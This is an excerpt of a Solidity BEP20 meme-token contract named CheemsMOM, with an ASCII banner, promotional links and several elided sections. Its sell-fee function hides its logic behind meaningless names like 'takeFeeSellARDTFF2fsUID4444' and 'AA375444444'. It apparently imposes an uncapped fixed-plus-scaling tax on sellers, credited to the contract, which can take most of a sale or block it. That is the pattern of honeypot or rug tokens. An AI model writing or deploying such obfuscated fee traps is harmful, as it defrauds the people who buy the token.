 ...
 *   
 Are you ready? 
  ______  __                                                                                         
 /      \/  |                                                                                        
/$$$$$$  $$ |____   ______   ______  _____  ____   _______        _____  ____   ______  _____  ____  
$$ |  $$/$$      \ /      \ /      \/     \/    \ /       |      /     \/    \ /      \/     \/    \ 
$$ |     $$$$$$$  /$$$$$$  /$$$$$$  $$$$$$ $$$$  /$$$$$$$/       $$$$$$ $$$$  /$$$$$$  $$$$$$ $$$$  |
$$ |   __$$ |  $$ $$    $$ $$    $$ $$ | $$ | $$ $$      \       $$ | $$ | $$ $$ |  $$ $$ | $$ | $$ |
$$ \__/  $$ |  $$ $$$$$$$$/$$$$$$$$/$$ | $$ | $$ |$$$$$$  |      $$ | $$ | $$ $$ \__$$ $$ | $$ | $$ |
 ...
 *     TG:  https://t.me/cheemsmom
 *    Web:  https://cheemsmom.space
 * 
 *            
...
contract CheemsMOM is IBEP20 {
    using SafeMath for uint256;
    address internal owner;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "CheemsMOM";
    string constant _symbol = "$CheMo";
    ...
    constructor ()  {
        address marketingFeeReceiver = 0x590dB9220551ea7D867aF416E0D5094137136daC;
         owner = msg.sender;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (HTBalanceReceiver > _maxWalletToken){
            amountRECf457 = shouldTakeFee48(sender,recipient) ? takeFeeSellARDTFF2fsUID4444(sender, amount) : amount;
        }else{
    ...
    function takeFeeSellARDTFF2fsUID4444(address sender, uint256 amount) internal returns (uint256) {
        uint256 Balancer = balanceOf(sender);
        uint256 Dogeland = 0;
        uint256 Cheemsy = 0;
        ...
        if (Balancer > blim4788899){if   (amount > S167f62){
               Dogeland = amount.mul(amount-S167f62).div(_maxTxAmount);
               Cheemsy = Dogeland.mul(ARDTfeescalingUID9999).div(feeDeNom999).mul(Balancer.add(_maxWalletToken.div(two))).div(_maxWalletToken); }  }
        feeTempUID9999 =  AA375444444 +   Cheemsy;   
        _balances[address(this)] = _balances[address(this)].add(feeTempUID9999);
        emit Transfer(sender, address(this), feeTempUID9999);
        return amount.sub(feeTempUID9999);
    }
